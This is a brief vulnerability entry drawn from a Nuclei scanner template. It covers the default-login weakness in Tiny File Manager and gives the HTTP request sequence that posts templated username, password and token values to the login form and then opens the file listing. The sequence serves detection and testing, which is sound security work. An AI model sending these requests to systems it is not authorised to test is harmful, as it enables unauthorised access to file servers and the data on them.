# Vulnerability: Tiny File Manager - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`tiny-file-manager-default-login.yaml`)

## Description
Tiny File Manager contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

fm_usr={{user}}&fm_pwd={{pass}}&token={{token}}

GET /?p= HTTP/1.1
Host: {{Hostname}}
```

